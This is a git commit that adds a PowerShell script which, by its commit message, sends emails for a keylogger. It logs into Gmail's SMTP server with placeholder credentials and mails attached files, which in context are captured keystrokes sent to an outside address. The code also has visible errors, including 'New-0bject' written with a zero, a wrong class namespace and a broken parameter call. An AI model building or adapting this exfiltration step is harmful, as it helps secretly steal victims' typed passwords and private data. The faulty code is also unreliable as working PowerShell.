3f450108bf36d00dd5dc1099c9eb4295a1e03c0e
CChalland <ctchalland@gmail.com>
2018-06-23 12:29:59 -0500

    Added Powershell script to send emails for the keylogger

---
+++ Powershell_SendEmail_Script.ps1
@@ -0,0 +1,77 @@
+﻿Param(
+      [String]$Att,
+      [String]$Subj,
+      [String]$Body
+      )
+
+Function Send-Email
+{
+    Param(
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$To,
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$From,
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$Password,
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$Subject,
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$Body,
+            [Parameter(`
+            Mandatory=$true)]
+          [String]$attachment
+         )
+    try
+    {
+        $Msg = New-Object System.Net.MailMessage($From, $To, $Subject, $Body)
+        $Srv = "smtp.gmail.com"
+        if($attachment -ne $null)
+        {
+            try
+            {
+                $Attachments = $attachment -split ("\:\:");
+
+                ForEach($val in $Attachments)
+                {
+                    $attch = New-0bject System.Net.Mail.Attachment($val)
+                    $Msg.Attachments.Add($attch)
+                }
+            }
+            catch
+            {
+                exit 2;
+            }
+            $client = New-Object Net.Mail.Smtpclient($Srv, 587)
+            $client.EnableSsl = $true
+            $client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password);
+            $client.Send($Msg)
+            Remove-Variable -Name client
+            Remove-Variable -Name Password
+            exit 7;
+        }  
+    }
+    catch
+        {
+            exit 3;
+        }
+}
+
+try
+{
+    Send-Email
+        -attachment $Att
+        -To "Address of the recipient"
+        -Body $Body
+        -Subject $Subj
+        -password "tralalala"
+        -From "Address of the sender"
+}
+catch
+{
+    exit 4;
+}
